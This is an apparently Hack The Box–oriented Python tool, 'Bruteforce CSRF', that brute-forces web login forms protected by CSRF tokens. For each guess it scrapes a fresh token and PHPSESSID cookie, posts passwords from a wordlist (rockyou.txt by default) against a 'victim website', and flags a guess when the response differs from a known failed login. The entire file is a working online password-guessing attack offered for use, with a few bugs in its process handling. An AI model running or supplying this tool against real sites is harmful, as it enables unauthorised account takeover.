#!/usr/bin/env python3
import re
import argparse
from itertools import islice
from multiprocessing import Process, Queue
import time
import sys
from termcolor import colored
import requests


# Author: J3wker
# HTB Profile: https://www.hackthebox.eu/home/users/profile/165824
# GitHub: https://github.com/J3wker/PToolity

x = """
  ██╗          ██╗██████╗ ██╗    ██╗██╗  ██╗███████╗██████╗      ██╗
 ██╔╝          ██║╚════██╗██║    ██║██║ ██╔╝██╔════╝██╔══██╗     ╚██╗
██╔╝█████╗     ██║ █████╔╝██║ █╗ ██║█████╔╝ █████╗  ██████╔╝█████╗╚██╗
╚██╗╚════╝██   ██║ ╚═══██╗██║███╗██║██╔═██╗ ██╔══╝  ██╔══██╗╚════╝██╔╝
 ╚██╗     ╚█████╔╝██████╔╝╚███╔███╔╝██║  ██╗███████╗██║  ██║     ██╔╝
  ╚═╝      ╚════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     ╚═╝
   """


def creds():
    print(colored(x, "red"))
    print(colored("Bruteforce CSRF", "blue"))
    print(colored("---------------------\n", "green"))
    print(colored("Author: J3wker", "red"))
    print(colored("HTB Profile: https://www.hackthebox.eu/profile/165824", "green"))
    print(colored("GitHub: https://github.com/J3wker\n\n", "green"))


def parse():
    parser = argparse.ArgumentParser(
        description='[+] Usage: ./brutecsrf.py --url http://test.com  --csrf centreon_token --u admin \n | NOTE: If a field dont have a name - set them as "" '
    )
    parser.add_argument("--url", dest="target_url", help="Victim Website")
    parser.add_argument("--csrf", dest="csrf", help=" csrf name in HTTP form")
    parser.add_argument(
        "--u", "--user", dest="username", help=" username you are brute forcing"
    )
    parser.add_argument(
        "--lu", "--fuser", dest="usr", help=" username field name in HTML form"
    )
    parser.add_argument(
        "--p", "--passwd", dest="passwd", help=" password field name in HTML form"
    )
    parser.add_argument(
        "--s", "--sub", dest="sub", help=" submit field name in HTML form"
    )
    parser.add_argument("--w", "--wordlist", dest="wordlist", help=" path to wordlist")

    options = parser.parse_args()

    return options


# Function to the sumbit button
def get_form():
    attack = requests.get(target_url, allow_redirects=False)
    data = attack.content
    data = str(data)
    submit = re.search(
        '(?:<input.* name=")(.*)" (?:value=")(.*)(?:" type="submit".*/>)', data
    )
    submit_name = submit.group(1)
    submit_value = submit.group(2)

    return [submit_name, submit_value]


# Function to basic data such as a Cookie and CSRF token from the website
def get_data():
    attack = requests.get(target_url, allow_redirects=False)
    data = attack.content
    headers = str(attack.headers["set-cookie"])
    cookie = re.search("(?:PHPSESSID=)(.*)(?:;)", headers)
    cookie = cookie.group(1)
    data = str(data)
    token = re.search(f'(?:<.* name="{csrf}" .* value=")(.*)(?:" />)', data)
    csrft = token.group(1)
    if not csrft:
        headers = str(attack.headers[f"{csrf}"])
        token = re.search(f"(?:{csrf}=)(.*)(?:;)", headers)
        csrft = token.group(1)

    return [str(csrft), str(cookie)]


# Function that gets the response from a wrong password to compare it with each response - when we have the right password response will different.
def get_wrong(username):
    forge = get_data()
    data = {fuser: username, passwdf: "omri", csrf: forge[0], submit_name: submit_value}
    cookie = {"PHPSESSID": forge[1]}
    response = requests.post(target_url, data=data, cookies=cookie)
    response = str(response.content)
    response = re.sub(f'(?:<.* name="{csrf}" .* value=")(.*)(?:" />)', "omri", response)

    return response


# Function that does the attack


def attack(username, wordlist, process_queue):
    for line in wordlist:
        word = line.strip()
        wrong = get_wrong(username)
        forge = get_data()  # creating data for the POST request
        data = {fuser: username, passwdf: "", csrf: forge[0], submit_name: submit_value}
        cookie = {"PHPSESSID": forge[1]}
        print("Trying : " + word, end="\r")
        sys.stdout.flush()
        data[passwdf] = word
        response = requests.post(target_url, data=data, cookies=cookie)
        response = str(response.content)
        response = response.replace(
            f'value="{word}"', 'value="omri"'
        )  # Replacing the password field with the word 'omri' so we can compare it to wrong response
        response = re.sub(
            f'(?:<.* name="{csrf}" .* value=")(.*)(?:" />)', "omri", response
        )  # Replacing the CSRF token with 'omri' so we can comapre it to the wrong response
        if response != wrong:
            process_queue.put(word)


def thread_controller(wordlist, thread_words):
    """
    Control the exec and termination of all threads spawned by this script.

    :param wordlist {String}: Path to wordlist file we want to use
    :param thread_words {Integer}: Word count to send to each thread for execution
    """
    shared_process_queue = Queue()
    active_process_list = []
    starting_word = 0

    with open(wordlist, "r") as wordlist_line:
        wordlist_sent = islice(
            wordlist_line, starting_word, thread_words
        )  # Avoid reading entire file into memory
        process = Process(
            target=attack, args=(user, wordlist_sent, shared_process_queue)
        )
        process.start()
        active_process_list.append(process)
        starting_word += thread_words
        if shared_process_queue.get() > 0:
            word = shared_process_queue.get()
            print("b[+] Password found: " + colored(word, "green"))
            for process in active_process_list:
                process.kill()
            return


# a bit of a mess but we needed this way instead of making a main function the returns all of that
# we have a lot of data being processed so thats my only way to make the program quick and easy and save lines
# nevertheless it works fine so we're good happy hackers.
if __name__ == "__main__":
    thread_words = (
        120
    )  # Note all Vars in this block are globle but we still pass params to make it easier to read
    try:
        options = parse()
        target_url = options.target_url

        csrf = options.csrf
        user = options.username
        passwdf = options.passwd
        fuser = options.usr
        form = get_form()
        submit_name = form[0]
        submit_value = form[1]
        wordlist = options.wordlist
        if wordlist == None:
            wordlist = "/root/rockyou.txt"
        if passwdf == None:
            passwdf = "password"
        if fuser == None:
            fuser = "username"

        creds()
        thread_controller(wordlist, thread_words)
    except KeyboardInterrupt:
        print(colored("\n\n[-] Detected Ctrl + C ... Program Existed", "red"))
        sys.exit()

    except Exception as e:
        print(
            colored(
                "[-] Something went wrong - check wordlist path OR request timed out",
                "red",
            )
        )
